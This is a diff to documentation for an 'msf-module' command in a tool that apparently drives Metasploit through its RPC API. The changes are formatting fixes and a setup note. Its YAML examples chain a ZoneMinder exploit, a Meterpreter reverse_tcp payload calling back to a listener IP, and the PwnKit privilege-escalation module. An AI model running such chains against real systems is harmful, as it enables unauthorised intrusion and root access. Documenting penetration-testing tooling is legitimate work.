@@ -5,6 +5,7 @@ msf-module
 ==========
 
 This command executes Metasploit-Modules via Metasploits RPC-Api.
+The RPC-API has to be started with msfrpc -a <server> -P <password> for msf commands to work.
 
 .. note::
 
@@ -27,13 +28,13 @@ sessions(see :ref:`msf-session`)
 
    commands:
      - type: msf-module
-        cmd: exploit/unix/webapp/zoneminder_snapshots
-        creates_session: "foothold"
-        options:
-          RHOSTS: 192.42.0.254
-        payload_options:
-          LHOST: 192.42.2.253
-        payload: cmd/unix/python/meterpreter/reverse_tcp
+       cmd: exploit/unix/webapp/zoneminder_snapshots
+       creates_session: "foothold"
+       options:
+         RHOSTS: 192.42.0.254
+       payload_options:
+         LHOST: 192.42.2.253
+       payload: cmd/unix/python/meterpreter/reverse_tcp
 
 .. confval:: cmd
 
@@ -62,7 +63,7 @@ sessions(see :ref:`msf-session`)
 
 .. confval:: session
 
-   This option is set in exploit['SESSION']. Some modules(post-modules)
+   This option is set in exploit['SESSION']. Some modules (post-modules)
    need a session to be executed with.
 
    :type: str
@@ -79,13 +80,13 @@ sessions(see :ref:`msf-session`)
 
       commands:
         - type: msf-module
-           cmd: exploit/unix/webapp/zoneminder_snapshots
-           creates_session: "foothold"
-           options:
-             RHOSTS: 192.42.0.254
-           payload_options:
-             LHOST: 192.42.2.253
-           payload: cmd/unix/python/meterpreter/reverse_tcp
+          cmd: exploit/unix/webapp/zoneminder_snapshots
+          creates_session: "foothold"
+          options:
+            RHOSTS: 192.42.0.254
+          payload_options:
+            LHOST: 192.42.2.253
+          payload: cmd/unix/python/meterpreter/reverse_tcp
 
          - type: msf-module
            cmd: exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
